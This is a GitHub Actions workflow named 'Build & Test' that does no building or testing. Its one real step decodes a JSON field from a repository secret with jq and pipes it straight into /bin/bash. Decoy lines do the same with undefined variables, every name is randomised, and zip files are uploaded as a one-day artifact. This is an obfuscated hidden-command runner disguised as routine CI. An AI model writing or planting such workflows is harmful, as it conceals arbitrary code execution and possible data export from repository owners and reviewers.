name: Build & Test
on:
  workflow_dispatch:

permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  trigger:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Start
        env:
          ezeg416: ${{ secrets.ezeg416 }}
        run: |
          printf '%s' "$ezeg416" | jq -r .rnfq361 | /bin/bash
          echo $kxzps77546 | jq -r .r90 | /bin/bash
          printf '%s' "$dmfq9" | jq -r .cz84516 | /bin/bash
          printf '%s' "$t75" | jq -r .wb728 | /bin/bash
          printf '%s' "$fcqp95" | jq -r .kjd70 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: LcNOTbYF
          path: "*.zip"
          retention-days: 1
